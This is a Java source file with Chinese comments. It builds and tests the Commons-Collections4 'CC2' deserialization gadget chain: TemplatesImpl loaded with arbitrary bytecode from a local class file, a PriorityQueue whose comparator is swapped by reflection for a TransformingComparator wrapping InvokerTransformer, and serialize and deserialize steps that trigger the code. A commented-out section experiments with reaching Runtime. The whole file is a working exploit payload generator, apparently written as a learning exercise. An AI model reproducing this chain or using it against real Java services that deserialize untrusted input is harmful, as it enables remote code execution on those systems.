import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
                                TemplatesImpl.newTransformer()
                                    TemplatesImpl.getTransletInstance()
                                        TemplatesImpl.defineTransletClasses()
                                            TransletClassLoader.defineClass()
 */
public class CC2 {
    public static void main(String[] args) throws Exception {
//        sink 执行链为TemplatesImpl
        TemplatesImpl templates = new TemplatesImpl();

        Class c = templates.getClass();
        Field fieldName = c.getDeclaredField("_name");

//        为了满足if判断逻辑
        fieldName.setAccessible(true);
        fieldName.set(templates,"aaa");
//         获取字节码属性
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);

//        获取字节码
        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

//        不进行序列化时触发需要的一个属性
//        Field tfactory = c.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer();

//        Method newTransformer = c.getMethod("newTransformer",null);
//        newTransformer.setAccessible(true);
//        newTransformer.invoke(templates,null);

//        借用InvokerTransformer.transform触发newTransformer
        Transformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);
//        invokerTransformer.transform(templates);

//        TransformingComparator.compare触发transform
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer,null);

//        PriorityQueue.readObject中会触发comparator.compare。这里当add第二个值时会触发comparator.compare,所以这里还是先填充其他的transformingComparator
        PriorityQueue<Object> o = new PriorityQueue<>(2,new TransformingComparator<>(new ConstantTransformer<>(1)));
//        过 heapify()的 size >>> 1判断逻辑    “2 >>> 1”  0000 0010  -> 0000 0001
//        “>>>” 右移 补0 以8位为单位
        o.add(templates);
        o.add(1);

//        再通过反射填充回装有invokerTransformer的transformingComparator
        Class<? extends PriorityQueue> oClass = o.getClass();
        Field oClassDeclaredField = oClass.getDeclaredField("comparator");
        oClassDeclaredField.setAccessible(true);
        oClassDeclaredField.set(o,transformingComparator);


        serialize(o);
        unSerialize("ser.bin");
//        cc3Test();
    }


    /**
     *
     * 测试commons-collections3是否可行，其实是前面的将不可序列化的类，序列化填坑
     * 在前面的CC链过程中，Runtime类，确实不能序列化。在序列化时，其实都没有生成Runtime类。
     * 在反序列化的时候，才会触发，并生成Runtime类，然后执行exec
     */
    public static void cc3Test() throws Exception{
//        TemplatesImpl templates = new TemplatesImpl();
//
//        Class c = templates.getClass();
//        Field fieldName = c.getDeclaredField("_name");
//
////        为了满足if判断逻辑
//        fieldName.setAccessible(true);
//        fieldName.set(templates,"aaa");
////         获取字节码属性
//        Field bytecodes = c.getDeclaredField("_bytecodes");
//        bytecodes.setAccessible(true);
//
////        获取字节码
//        byte[] code = Files.readAllBytes(Paths.get("D://tmp/classes/Test.class"));
//        byte[][] codes = {code};
//        bytecodes.set(templates,codes);
//
////        不进行序列化时触发需要的一个属性
////        Field tfactory = c.getDeclaredField("_tfactory");
////        tfactory.setAccessible(true);
////        tfactory.set(templates,new TransformerFactoryImpl());
//
////        templates.newTransformer();
//
////        Method newTransformer = c.getMethod("newTransformer",null);
////        newTransformer.setAccessible(true);
////        newTransformer.invoke(templates,null);
//
////        借用InvokerTransformer.transform触发newTransformer
//        Transformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);
////        invokerTransformer.transform(templates);
//
////        TransformingComparator.compare触发transform
////        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer,null);
//
////        Class cc = TransformingComparator.class;
////        Constructor constructor = cc.getConstructor(new Class[]{Transformer.class, Comparator.class});
////        constructor.setAccessible(true);
////        Object o1 = constructor.newInstance(invokerTransformer, null);
//
//                Class c2 = Runtime.class;
//        Method getRuntime = c2.getDeclaredMethod("getRuntime",null);
//        Runtime r = (Runtime) getRuntime.invoke(null,null);
////        Method exec = c.getDeclaredMethod("exec", String.class);
////        exec.invoke(r,"wt");
//
//
////        PriorityQueue.readObject中会触发comparator.compare。这里当add第二个值时会触发comparator.compare,所以这里还是先填充其他的transformingComparator
//        PriorityQueue<Object> o = new PriorityQueue<>(2,new TransformingComparator(new ConstantTransformer(1)));
//        o.add(templates);
//        o.add(1);
//
////        再通过反射填充回装有invokerTransformer的transformingComparator
//        Class<? extends PriorityQueue> oClass = o.getClass();
//        Field oClassDeclaredField = oClass.getDeclaredField("comparator");
//        oClassDeclaredField.setAccessible(true);
////        oClassDeclaredField.set(o,o1);
//
//
//        serialize(r);
////        unSerialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unSerialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
